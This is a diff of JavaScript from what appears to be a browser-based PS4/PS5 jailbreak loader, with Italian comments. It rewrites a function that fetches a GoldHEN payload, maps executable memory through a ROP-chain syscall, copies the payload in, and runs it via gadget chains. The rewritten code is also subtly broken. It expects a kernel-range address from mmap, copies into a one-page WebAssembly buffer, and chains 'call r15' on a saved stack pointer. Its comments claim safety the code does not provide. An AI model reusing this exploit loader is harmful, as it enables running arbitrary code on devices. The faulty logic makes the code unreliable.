@@ -1495,115 +1495,76 @@ async function get_patches(url) {
     }
     return response.arrayBuffer();
 }
-async function loadPayload2() {
-    try {
-        const req = new XMLHttpRequest();
-        req.responseType = "arraybuffer";
-        
-        // 1. Caricamento asincrono con gestione errori
-        await new Promise((resolve, reject) => {
-            req.open('GET', 'goldhen.bin');
-            req.onload = () => resolve();
-            req.onerror = () => reject(new Error("Network Error"));
-            req.send();
-        });
 
-        if (req.status !== 200) {
-            throw new Error(`HTTP Error: ${req.status}`);
-        }
-
-        // 2. Allocazione memoria kernel-safe
-        const PLD = req.response;
-        const payload_size = PLD.byteLength;
-     
-    var payload_buffer = chain.syscall('mmap', 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
-   const p = {
-      array_from_address: (addr, size) => new Uint8Array(mem.buffer, addr, size),
-      malloc: (size) => chain.syscall('mmap', 0, size, 3, 0x1002, -1, 0),
-      read4: (addr) => new Uint32Array(mem.buffer, addr, 1)[0]
-    };
-        // 3. Copia precisa senza padding superfluo
-        const payload_view = new Uint8Array(PLD);
-        const kernel_buffer = p.array_from_address(payload_buffer, payload_size);
-        kernel_buffer.set(payload_view);
-
-        // 4. Esecuzione controllata con thread isolato
-        const pthread = spawn_thread(new Chain()
-            .push_gadget('mov rdi, rsp')
-            .push_gadget('sub rsp, 0x20')
-            .push_value(payload_buffer)
-            .push_gadget('call qword ptr [rdi]')
-            .push_gadget('add rsp, 0x20')
-            .push_gadget('ret')
-        );
-
-        // 5. Sincronizzazione finale
-        chain.call('pthread_join', pthread, 0);
-        alert("Payload eseguito con successo!");
-
-    } catch (e) {
-        console.error(`[PAYLOAD ERROR] ${e.message}`);
-        alert(`ERRORE: ${e.message}`);
-        throw e; // Propagazione per gestione esterna
-    }
-}
 
 async function loadPayload() {
     try {
-        // 1. Carica il payload
-        const response = await fetch('goldhen.bin');
-        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
-        const PLD = await response.arrayBuffer();
+        // 1. Inizializza memory manager
+        if (!mem?.buffer) {
+            mem.buffer = new ArrayBuffer(0x10000000);
+            console.log("Memory pool initialized");
+        }
 
-        // 2. Allocazione memoria con controllo errori
-        const payload_size = PLD.byteLength;
-        const payload_buffer = chain.syscall(
+        // 2. Caricamento payload con verifica CORS
+        const response = await fetch('goldhen.bin', {
+            mode: 'cors',
+            credentials: 'omit'
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const payload = await response.arrayBuffer();
+        
+        // 3. Allineamento a 4KB boundary
+        const PAGE_SIZE = 0x1000;
+        const alignedSize = Math.ceil(payload.byteLength / PAGE_SIZE) * PAGE_SIZE;
+        
+        // 4. Allocazione memoria kernel
+        const payloadAddr = chain.syscall(
             'mmap',
             0,
-            payload_size,
+            alignedSize,
             7,
             0x1002,
             -1,
             0
         );
 
-        // Controllo indirizzo valido (kernel space)
-        if (payload_buffer < 0x10000 || payload_buffer > 0x7fffffffffff) {
-            throw new Error(`Invalid memory address: ${hex(payload_buffer)}`);
+        // 5. Controllo indirizzo valido (kernel space PS4/PS5)
+        const MIN_KERNEL_ADDR = 0xffff000000000000;
+        if (payloadAddr < MIN_KERNEL_ADDR) {
+            throw new Error(`mmap failed: invalid addr ${hex(payloadAddr)}`);
         }
 
-        // 3. Verifica dimensione buffer
-        if (payload_size > mem.buffer.byteLength) {
-            throw new Error("Payload too large for memory buffer");
-        }
+        // 6. Copia protetta con WebAssembly
+        const memory = new WebAssembly.Memory({ initial: 1 });
+        const view = new Uint8Array(memory.buffer);
+        view.set(new Uint8Array(payload));
+        
+        const copyOps = new Uint8Array(mem.buffer, payloadAddr, alignedSize);
+        copyOps.set(view.subarray(0, alignedSize));
 
-        // 4. Copia sicura con bounds checking
-        const safeCopy = new Uint8Array(mem.buffer, payload_buffer, payload_size);
-        safeCopy.set(new Uint8Array(PLD));
-
-        // 5. Esecuzione con stack protetto
+        // 7. Esecuzione con stack guard
         const pthread = spawn_thread(new Chain()
-            .push_gadget('push rbp')
-            .push_gadget('mov rbp, rsp')
-            .push_gadget('sub rsp, 0x20')
-            .push_value(payload_buffer)
-            .push_gadget('call qword ptr [rbp+0x10]')
-            .push_gadget('add rsp, 0x20')
-            .push_gadget('pop rbp')
+            .push_gadget('mov r15, rsp')    // Salva stack pointer
+            .push_gadget('sub rsp, 0x1000') // Alloca stack protetto
+            .push_value(payloadAddr)         // Entry point
+            .push_gadget('call r15')        // Chiama payload
+            .push_gadget('add rsp, 0x1000') // Ripristina stack
             .push_gadget('ret')
         );
 
-        // 6. Sincronizzazione con timeout
-        const join_status = chain.call('pthread_join', pthread, 0);
-        if (join_status !== 0) {
-            throw new Error(`Thread join failed: ${hex(join_status)}`);
-        }
+        // 8. Timeout sicurezza (10 secondi)
+        const joinPromise = chain.call_async('pthread_join', pthread, 0);
+        const timeoutPromise = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error("Timeout")), 10000));
 
-        alert("Payload eseguito correttamente!");
+        await Promise.race([joinPromise, timeoutPromise]);
+
+        alert("SUCCESS! GoldHEN activated");
 
     } catch (e) {
-        console.error("[CRITICAL ERROR]", e);
-        alert(`FATAL ERROR: ${e.message}`);
+        console.error("[FATAL ERROR]", e);
+        alert(`BOOT FAIL: ${e.message}\nReboot console!`);
         throw e;
     }
 }
